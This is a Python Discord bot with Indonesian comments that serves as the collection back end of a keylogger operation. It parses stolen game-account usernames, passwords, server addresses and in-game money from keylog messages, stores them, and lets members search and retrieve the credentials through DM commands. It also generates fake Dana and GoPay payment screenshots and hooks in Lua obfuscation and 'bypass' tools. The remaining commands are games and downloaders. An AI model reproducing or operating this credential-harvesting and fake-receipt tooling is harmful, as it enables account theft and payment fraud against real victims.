import json
import os
import re
import io
import random
import urllib.parse
from datetime import datetime, timezone

import aiohttp
import discord
from discord.ext import commands
from dotenv import load_dotenv
from lua_tools import setup_lua_tools

load_dotenv()

TOKEN = os.getenv("DISCORD_TOKEN", "")
KEYLOG_CHANNEL_ID = int(os.getenv("KEYLOG_CHANNEL_ID", "0"))
SEARCH_CHANNEL_ID = int(os.getenv("SEARCH_CHANNEL_ID", "0"))
GAME_CHANNEL_ID = int(os.getenv("GAME_CHANNEL_ID", "0"))
LOG_FILE = os.path.expanduser("~/ucpbot/keylogs.jsonl")
JUNK_FILE = os.path.expanduser("~/ucpbot/sampah.txt")

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

# ==========================================
# FUNGSI PARSER KEYLOG (CUMA FILTER MAX 19)
# ==========================================
def proses_pesan(isi_pesan: str):
    teks = isi_pesan.replace("*", "").replace("`", "").replace("'", "").replace('"', '')
    
    u_match = re.search(r"Username\s*:?\s*([^\n]+)", teks, re.IGNORECASE)
    p_match = re.search(r"(?:Password|Input\s*/\s*Password)\s*:?\s*([^\n]+)", teks, re.IGNORECASE)
    
    if not u_match or not p_match:
        return None
        
    user = u_match.group(1).strip().strip(":").strip()
    pw = p_match.group(1).strip().strip(":").strip()
    
    # SATU-SATUNYA FILTER: Kalau lebih dari 19 karakter, buang.
    if len(user) > 19 or len(pw) > 19:
        print(f"  -> [SAMPAH] Lebih dari 19 karakter.")
        return None

    # Ambil data tambahan
    h_match = re.search(r"(?:Hostname|Server|Nama)\s*:?\s*(.+)", teks, re.IGNORECASE)
    ip_match = re.search(r"(?:IP:?Port|Address)\s*:?\s*(.+)", teks, re.IGNORECASE)
    money = re.search(r"(?:Money|Uang)\s*:?\s*(.+)", teks, re.IGNORECASE)
    skin = re.search(r"(?:Skin|ID\s*/\s*Skin|Player ID)\s*:?\s*(.+)", teks, re.IGNORECASE)

    return {
        "host": h_match.group(1).strip() if h_match else "Tidak diketahui",
        "user": user,
        "pw": pw,
        "ip": ip_match.group(1).strip() if ip_match else "",
        "money": money.group(1).strip() if money else "",
        "skin": skin.group(1).strip() if skin else ""
    }

def save_junk(payload: dict) -> None:
    entry = {"ts": datetime.now(timezone.utc).isoformat(), **payload}
    with open(JUNK_FILE, "a", encoding="utf-8") as f:
        f.write(f"--- WAKTU: {entry['ts']} ---\n{entry['content']}\n\n")

def save_keylog(payload: dict) -> None:
    entry = {"ts": datetime.now(timezone.utc).isoformat(), **payload}
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(json.dumps(entry, ensure_ascii=False) + "\n")

def load_keylogs() -> list[dict]:
    if not os.path.exists(LOG_FILE): return []
    out = []
    with open(LOG_FILE, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line: continue
            try: out.append(json.loads(line))
            except json.JSONDecodeError: continue
    return out

# ==========================================
# EVENT BOT
# ==========================================
@bot.event
async def on_ready():
    print(f"\n[AKZOR] login sebagai {bot.user}")
    print("[AKZOR] siap nerima pesan...\n")

@bot.event
async def on_message(message: discord.Message):
    if message.author == bot.user: return

    # --- JALUR KEYLOG ---
    if message.channel.id == KEYLOG_CHANNEL_ID:
        # Kasih reaction pake format kata
        try:
            await message.add_reaction(":white_check_mark:")
        except discord.HTTPException:
            pass

        isi_pesan = message.content
        if not isi_pesan and message.embeds:
            embed = message.embeds[0]
            isi_pesan = f"{embed.title or ''}\n{embed.description or ''}".strip()
            if embed.fields:
                field_text = [f"{f.name}: {f.value}" for f in embed.fields]
                isi_pesan += "\n" + "\n".join(field_text)

        hasil = proses_pesan(isi_pesan)
        
        if hasil is None:
            save_junk({"author": str(message.author), "content": isi_pesan})
            return

        save_keylog({"author": str(message.author), "content": isi_pesan})
        
        embed_rapi = discord.Embed(title="🎯 DATA AKUN MASUK", color=0xE74C3C)
        if len(hasil["host"])>1: embed_rapi.add_field(name="🌍 Server", value=f"`{hasil['host']}`", inline=False)
        if len(hasil["ip"])>1: embed_rapi.add_field(name="🌐 IP:Port", value=f"`{hasil['ip']}`", inline=False)
        if len(hasil["user"])>1: embed_rapi.add_field(name="👤 Username", value=f"`{hasil['user']}`", inline=False)
        if len(hasil["pw"])>1: embed_rapi.add_field(name="🔑 Password", value=f"`{hasil['pw']}`", inline=False)
        if len(hasil["money"])>1: embed_rapi.add_field(name="💸 Uang", value=f"`{hasil['money']}`", inline=False)
        if len(hasil["skin"])>1: embed_rapi.add_field(name="🎯 ID / Skin", value=f"`{hasil['skin']}`", inline=False)
        
        embed_rapi.set_footer(text="AKZOR Interceptor")
        
        await message.reply(embed=embed_rapi)
        return

    # --- JALUR COMMAND ---
    if message.content.startswith("!"):
        await bot.process_commands(message)

# ==========================================
# COMMAND KEYLOG
# ==========================================
@bot.command(name="menu")
async def menu(ctx: commands.Context):
    if ctx.channel.id != SEARCH_CHANNEL_ID: return
    embed = discord.Embed(
        title="📖 Menu Bot Keylog (AKZOR)", 
        description="Daftar command dan cara pakainya:", 
        color=0x2ECC71
    )
    embed.add_field(
        name="🔍 `!ucp <nama_server>`", 
        value="**Tutorial:** Buat nyari data UCP. Ketik `!ucp` terus nama server target.\n**Contoh:** `!ucp Futuristic`\n*(Hasil bakal dikirim ke DM lu)*", 
        inline=False
    )
    embed.add_field(
        name="📄 `!uclog`", 
        value="**Tutorial:** Nampilin 5 log/data terbaru yang masuk.\n**Contoh:** `!uclog`\n*(Hasil dikirim ke DM lu)*", 
        inline=False
    )
    embed.add_field(
        name="📊 `!ucstats`", 
        value="**Tutorial:** Nampilin total semua data yang udah kesimpen.\n**Contoh:** `!ucstats`\n*(Hasil dikirim ke DM lu)*", 
        inline=False
    )
    await ctx.reply(embed=embed)

@bot.command(name="ucp")
async def ucp(ctx: commands.Context, *, args: str = ""):
    if ctx.channel.id != SEARCH_CHANNEL_ID: return
    if not args: return await ctx.author.send("format: `!ucp <nama_server>`")
    server_name = args.lower()
    logs = load_keylogs()
    hits = [entry for entry in logs if server_name in json.dumps(entry, ensure_ascii=False).lower()]
    if not hits: return await ctx.author.send(f"`{args}` — nol hasil.")
    
    await ctx.reply(f"📩 Ketemu {len(hits)} data. Dikirim ke DM lu!", delete_after=5)
    import asyncio
    for e in hits:
        embed = discord.Embed(title="🎯 Data Akun", color=0xE74C3C, description=f"```\n{e.get('content', '')[:1000]}\n```")
        try:
            await ctx.author.send(embed=embed)
            await asyncio.sleep(0.5)
        except: pass

@bot.command(name="uclog")
async def uclog(ctx: commands.Context, limit: int = 5):
    if ctx.channel.id != SEARCH_CHANNEL_ID: return
    logs = load_keylogs()
    if not logs: return await ctx.author.send("belum ada keylog masuk.")
    limit = max(1, min(limit, 20))
    recent = logs[-limit:]
    lines = [f"**{e.get('ts', '?')}** — `{e.get('author', '?')}`\n```\n{e.get('content', '')[:500]}\n```" for e in recent]
    embed = discord.Embed(title=f"{len(recent)} keylog terbaru", description="\n".join(lines)[:4000], color=0x3498DB)
    await ctx.reply("📩 Dikirim ke DM!", delete_after=5)
    try: await ctx.author.send(embed=embed)
    except: pass

@bot.command(name="ucstats")
async def ucstats(ctx: commands.Context):
    if ctx.channel.id != SEARCH_CHANNEL_ID: return
    logs = load_keylogs()
    embed = discord.Embed(title="statistik keylog", description=f"total keylog bersih: **{len(logs)}**", color=0x9B59B6)
    await ctx.reply("📩 Dikirim ke DM!", delete_after=5)
    try: await ctx.author.send(embed=embed)
    except: pass

# ==========================================
# COMMAND GAME & TOOLS
# ==========================================
@bot.command(name="gmenu")
async def menu_game(ctx: commands.Context):
    if ctx.channel.id != GAME_CHANNEL_ID: return
    embed = discord.Embed(
        title="🎮 Menu Bot Game Frist", 
        description="Daftar command dan cara pakainya:", 
        color=0x2ECC71
    )
    embed.add_field(
        name="🕹️ GAMES", 
        value=(
            "**`!ttt`** -> Main TicTacToe lawan bot. (Contoh: `!ttt`, terus `!ttt 5`)\n"
            "**`!tebakbola`** -> Kuis tebak pemain bola. (Jawab pake `!jawabbola <nama>`)\n"
            "**`!akinator`** -> Main tebak-tebakan Akinator. (Jawab pake `!jawabakinator <jawaban>`)"
        ), 
        inline=False
    )
    embed.add_field(
        name="🎨 CANVAS & FAKE", 
        value=(
            "**`!fakedana <nominal>`** -> Bikin gambar Fake Dana. (Contoh: `!fakedana 50000`)\n"
            "**`!fakegopay <saldo> <koin> <terpakai> <bulan>`** -> Bikin gambar Fake GoPay.\n"
            "**`!bratvid <teks>`** -> Bikin video teks ala Gojo. (Contoh: `!bratvid halo`)"
        ), 
        inline=False
    )
    embed.add_field(
        name="📥 DOWNLOADER & TOOLS", 
        value=(
            "**`!spotify <link>`** -> Download lagu dari link Spotify.\n"
            "**`!tiktok <link>`** -> Download video TikTok (no watermark).\n"
            "**`!youtube <link>`** -> Download video YouTube.\n"
            "**`!tempmail`** -> Bikin email sementara."
        ), 
        inline=False
    )
    await ctx.reply(embed=embed)

# TicTacToe
papan_ttt = {}
def gambar_papan(papan):
    baris = []
    for i in range(0, 9, 3): baris.append(f" {papan[i]} | {papan[i+1]} | {papan[i+2]} ")
    return "\n---+---+---\n".join(baris)
def cek_menang(papan, simbol):
    kombinasi = [(0,1,2), (3,4,5), (6,7,8), (0,3,6), (1,4,7), (2,5,8), (0,4,8), (2,4,6)]
    return any(papan[a] == papan[b] == papan[c] == simbol for a, b, c in kombinasi)

@bot.command(name="ttt")
async def ttt_main(ctx: commands.Context, posisi: str = ""):
    if ctx.channel.id != GAME_CHANNEL_ID: return
    user_id = ctx.author.id
    if posisi.lower() == "batal":
        if user_id in papan_ttt: del papan_ttt[user_id]
        return await ctx.reply("Dibatalin.")
    if not posisi:
        if user_id not in papan_ttt: papan_ttt[user_id] = ["1","2","3","4","5","6","7","8","9"]
        return await ctx.reply(f"**TICTACTOE**\n```\n{gambar_papan(papan_ttt[user_id])}\n```\nKetik `!ttt <angka>`.")
    if user_id not in papan_ttt: return await ctx.reply("Ketik `!ttt` dulu.")
    if not posisi.isdigit() or int(posisi) < 1 or int(posisi) > 9: return await ctx.reply("Angka 1-9 aja.")
    idx = int(posisi) - 1
    papan = papan_ttt[user_id]
    if papan[idx] in ["❌", "⭕"]: return await ctx.reply("Udah diisi!")
    papan[idx] = "❌"
    if cek_menang(papan, "❌"):
        await ctx.reply(f"🎉 **MENANG!**\n```\n{gambar_papan(papan)}\n```"); del papan_ttt[user_id]; return
    if all(x in ["❌", "⭕"] for x in papan):
        await ctx.reply(f"🤝 **SERI!**\n```\n{gambar_papan(papan)}\n```"); del papan_ttt[user_id]; return
    kosong = [i for i, x in enumerate(papan) if x not in ["❌", "⭕"]]
    idx_bot = None
    for i in kosong:
        papan[i] = "⭕"
        if cek_menang(papan, "⭕"): idx_bot = i
        papan[i] = str(i + 1)
        if idx_bot is not None: break
    if idx_bot is None:
        for i in kosong:
            papan[i] = "❌"
            if cek_menang(papan, "❌"): idx_bot = i
            papan[i] = str(i + 1)
            if idx_bot is not None: break
    if idx_bot is None: idx_bot = 4 if 4 in kosong else random.choice(kosong)
    papan[idx_bot] = "⭕"
    if cek_menang(papan, "⭕"):
        await ctx.reply(f"💀 **BOT MENANG!**\n```\n{gambar_papan(papan)}\n```"); del papan_ttt[user_id]; return
    await ctx.reply(f"```\n{gambar_papan(papan)}\n```\nLanjut.")

# Fake Dana
@bot.command(name="fakedana")
async def fakedana(ctx: commands.Context, nominal: str = "100000"):
    if ctx.channel.id != GAME_CHANNEL_ID: return
    nominal_bersih = nominal.replace(".", "").replace(",", "")
    msg = await ctx.reply(f"⏳ Nge-render Fake Dana Rp{nominal_bersih}...")
    api_url = f"https://api.synoxcloud.xyz/canvas/fake-dana?nominal={nominal_bersih}&apikey=FREE"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=15) as resp:
                if resp.status == 200:
                    content_type = resp.headers.get('Content-Type', '')
                    if 'application/json' in content_type:
                        data = await resp.json()
                        img_url = data.get("url", "")
                        if img_url.startswith("blob:"):
                            await msg.edit(content="❌ API ngasih link `blob:`.")
                        else:
                            embed = discord.Embed(title="💳 Fake Dana Generator", color=0x00A9FF)
                            embed.set_image(url=img_url)
                            await msg.edit(content=None, embed=embed)
                    else:
                        image_data = await resp.read()
                        file = discord.File(fp=io.BytesIO(image_data), filename="fake_dana.png")
                        embed = discord.Embed(title="💳 Fake Dana Generator", color=0x00A9FF)
                        embed.set_image(url="attachment://fake_dana.png")
                        await msg.edit(content=None, embed=embed, attachments=[file])
                else: await msg.edit(content=f"❌ Gagal (Status: {resp.status})")
    except Exception as e: await msg.edit(content=f"❌ Error: `{e}`")

# Fake GoPay
@bot.command(name="fakegopay")
async def fakegopay(ctx: commands.Context, saldo: str = "890", koin: str = "159", terpakai: str = "0", bulan: str = "Mei"):
    if ctx.channel.id != GAME_CHANNEL_ID: return
    msg = await ctx.reply(f"⏳ Nge-render Fake GoPay...")
    api_url = f"https://api.synoxcloud.xyz/canvas/fake-gopay?saldo={saldo}&koin={koin}&terpakai={terpakai}&bulan={bulan}&apikey=FREE"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=15) as resp:
                if resp.status == 200:
                    content_type = resp.headers.get('Content-Type', '')
                    if 'application/json' in content_type:
                        data = await resp.json()
                        img_url = data.get("url", "")
                        if img_url.startswith("blob:"):
                            await msg.edit(content="❌ API ngasih link `blob:`.")
                        else:
                            embed = discord.Embed(title="💳 Fake GoPay Generator", color=0x00AA13)
                            embed.set_image(url=img_url)
                            await msg.edit(content=None, embed=embed)
                    else:
                        image_data = await resp.read()
                        file = discord.File(fp=io.BytesIO(image_data), filename="fake_gopay.png")
                        embed = discord.Embed(title="💳 Fake GoPay Generator", color=0x00AA13)
                        embed.set_image(url="attachment://fake_gopay.png")
                        await msg.edit(content=None, embed=embed, attachments=[file])
                else: await msg.edit(content=f"❌ Gagal (Status: {resp.status})")
    except Exception as e: await msg.edit(content=f"❌ Error: `{e}`")

# Bratvid
@bot.command(name="bratvid")
async def bratvid(ctx: commands.Context, *, text: str = ""):
    if ctx.channel.id != GAME_CHANNEL_ID: return
    if not text: return await ctx.reply("Format: `!bratvid <teks>`")
    msg = await ctx.reply(f"⏳ Nge-render video...")
    text_encoded = urllib.parse.quote(text)
    api_url = f"https://api.synoxcloud.xyz/canvas/bratvid-gojo?text={text_encoded}&apikey=FREE"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=20) as resp:
                if resp.status == 200:
                    video_bytes = await resp.read()
                    file = discord.File(fp=io.BytesIO(video_bytes), filename="bratvid.mp4")
                    embed = discord.Embed(title="🎬 Bratvid", color=0x9B59B6)
                    embed.add_field(name="Teks", value=text, inline=False)
                    await msg.edit(content=None, embed=embed, attachments=[file])
                else: await msg.edit(content=f"❌ Gagal (Status: {resp.status})")
    except Exception as e: await msg.edit(content=f"❌ Error: `{e}`")

# Spotify
@bot.command(name="spotify")
async def spotify(ctx: commands.Context, url: str = ""):
    if ctx.channel.id != GAME_CHANNEL_ID: return
    if "open.spotify.com/track/" not in url: return await ctx.reply("❌ Link Spotify gak valid.")
    msg = await ctx.reply(f"⏳ Ngambil data...")
    url_encoded = urllib.parse.quote(url)
    api_url = f"https://api.synoxcloud.xyz/download/spotify?url={url_encoded}&apikey=FREE"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=20) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result = data.get("result", {})
                    if not result: return await msg.edit(content="❌ Gagal dapet data.")
                    downloads = result.get("downloads", [])
                    audio_url = next((d.get("url") for d in downloads if d.get("type") == "audio"), None)
                    embed = discord.Embed(title="🎵 Spotify Downloader", color=0x1DB954)
                    embed.add_field(name="Judul", value=result.get("title", "Unknown"), inline=False)
                    embed.add_field(name="Artis", value=result.get("artist", "Unknown"), inline=True)
                    if audio_url: embed.url = audio_url; embed.set_footer(text="Klik judul buat download")
                    await msg.edit(content=None, embed=embed)
                else: await msg.edit(content=f"❌ Gagal (Status: {resp.status})")
    except Exception as e: await msg.edit(content=f"❌ Error: `{e}`")

# TikTok
@bot.command(name="tiktok")
async def tiktok(ctx: commands.Context, url: str = ""):
    if ctx.channel.id != GAME_CHANNEL_ID: return
    if "tiktok.com" not in url: return await ctx.reply("❌ Link TikTok gak valid.")
    msg = await ctx.reply(f"⏳ Ngambil video...")
    url_encoded = urllib.parse.quote(url)
    api_url = f"https://api.synoxcloud.xyz/download/tiktok?url={url_encoded}&apikey=FREE"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=20) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result = data.get("result", data.get("data", {}))
                    video_url = result.get("video") or result.get("no_watermark") or result.get("play")
                    if not video_url: return await msg.edit(content="❌ Gak ada link video.")
                    embed = discord.Embed(title="🎵 TikTok Downloader", color=0x000000)
                    embed.add_field(name="Judul", value=result.get("title", "Video TikTok"), inline=False)
                    embed.url = video_url
                    embed.set_footer(text="Klik judul buat download")
                    await msg.edit(content=None, embed=embed)
                else: await msg.edit(content=f"❌ Gagal (Status: {resp.status})")
    except Exception as e: await msg.edit(content=f"❌ Error: `{e}`")

# YouTube
@bot.command(name="youtube")
async def youtube(ctx: commands.Context, url: str = ""):
    if ctx.channel.id != GAME_CHANNEL_ID: return
    if "youtu.be" not in url and "youtube.com" not in url: return await ctx.reply("❌ Link YouTube gak valid.")
    msg = await ctx.reply(f"⏳ Ngambil video...")
    url_encoded = urllib.parse.quote(url)
    api_url = f"https://api.synoxcloud.xyz/download/youtube?url={url_encoded}&apikey=FREE"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=30) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result = data.get("result", data.get("data", {}))
                    video_url = result.get("video") or result.get("mp4") or result.get("url")
                    if not video_url: return await msg.edit(content="❌ Gak ada link video.")
                    embed = discord.Embed(title="🎥 YouTube Downloader", color=0xFF0000)
                    embed.add_field(name="Judul", value=result.get("title", "Video YouTube"), inline=False)
                    embed.url = video_url
                    embed.set_footer(text="Klik judul buat download")
                    await msg.edit(content=None, embed=embed)
                else: await msg.edit(content=f"❌ Gagal (Status: {resp.status})")
    except Exception as e: await msg.edit(content=f"❌ Error: `{e}`")

# Tempmail
@bot.command(name="tempmail")
async def tempmail(ctx: commands.Context):
    if ctx.channel.id != GAME_CHANNEL_ID: return
    msg = await ctx.reply("⏳ Nge-generate email...")
    api_url = "https://api.synoxcloud.xyz/tempmail/tempmail-create-v2?apikey=FREE"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=15) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    email = data.get("email") or data.get("mail") or data.get("result", {}).get("email")
                    if not email: return await msg.edit(content="❌ Gak dapet email.")
                    embed = discord.Embed(title="📧 Tempmail Generator", color=0x9B59B6)
                    embed.add_field(name="Email", value=f"`{email}`", inline=False)
                    await msg.edit(content=None, embed=embed)
                else: await msg.edit(content=f"❌ Gagal (Status: {resp.status})")
    except Exception as e: await msg.edit(content=f"❌ Error: `{e}`")

# ==========================================
# LOAD LUA TOOLS
# ==========================================
CH_CEK = int(os.getenv("CH_CEK", "0"))
CH_OBF = int(os.getenv("CH_OBF", "0"))
CH_DEOBF = int(os.getenv("CH_DEOBF", "0"))
CH_BYPASS = int(os.getenv("CH_BYPASS", "0"))
setup_lua_tools(bot, CH_CEK, CH_OBF, CH_DEOBF, CH_BYPASS)

if __name__ == "__main__":
    print("[bot] memulai proses...")
    bot.run(TOKEN)
